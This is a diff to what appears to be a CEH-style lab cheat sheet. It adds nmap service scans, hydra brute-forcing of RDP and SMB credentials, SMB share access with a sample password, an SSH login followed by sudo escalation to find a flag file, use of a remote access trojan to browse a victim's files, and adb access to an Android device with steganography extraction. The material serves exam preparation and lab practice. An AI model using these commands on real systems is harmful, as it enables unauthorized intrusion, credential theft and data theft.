@@ -10,6 +10,12 @@ If even this the above command is not working then use this command-  namp -f 10
 6- Nmap scan for host discovery or OS- nmap -O 192.168.92.10 or you can use nmap -A 192.168.92.10
 7- If host is windows then use this command - nmap --script smb-os-discovery.nse 192.168.12.22 (this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
 8- nmap command for source port manipulation, in this port is given or we use common port-  nmap -g 80 10.10.10.10
+9- nmap --script smb-os-discovery -p 445 <DC-IP-Address>
+10- nmap -sV -p 25,80,110,143 <ip-subnet> # 192.168.0/24 to identify the number ofmercury services running
+11- nmap -p 3389 --open -sV 10.10.55.0/24 to Identify a machine with RDP service enabled
+12- nmap -p 80,443,8080,8443,5228 --open 10.10.55.0/24  to identify mobile devices
+13- nmap -p 22 --open 10.10.55.0/24  scan for SSh 
+14- nmap -p 139,445 --open -sV 10.10.55.0/24  to identify SMB services 
 ```
 # Enumeration
 ```
@@ -21,6 +27,22 @@ If even this the above command is not working then use this command-  namp -f 10
 5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
 				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
+7- hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X   Crack RDP Credentials
+8- smbclient -L \\10.10.55.X  to enumerate SMB Client
+9- hydra -L user_list.txt -P password_list.txt 10.10.55.X smb  brute force SMB credentials
+10- smbclient \\\\10.10.55.X\\share_name -U user%password123  Access SMB share
+get Sniffer.txt
+cat Sniffer.txt
+11- ssh marcus@10.10.55.X
+sudo -l
+sudo -i
+sudo vim
+find / -name "imroot.txt" 2>/dev/null
+cd /
+cat imroot.txt
+12- Thief RAT -> Connect to 10.10.55.X -> Authenticate
+Thief RAT -> File Manager -> Navigate to C:\Users\Username\Documents
+Thief RAT -> File Manager -> Open folder -> Count files
 ```
 #  Quick Overview (Stegnography) --> Snow , Openstego
 ```
@@ -88,6 +110,12 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 2- adb connect IP:5555    (Connect adb with parrot)
 3- adb shell              (Access mobile device on parrot)
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
+5- adb connect 10.10.55.X:5555
+6- adb shell
+7- find /sdcard/ -name "*.jpg" -o -name "*.png"
+8- adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg
+9- steghide extract -sf ceh.jpg
+10- cat hidden.txt
 ```
 # Wireshark
 ```
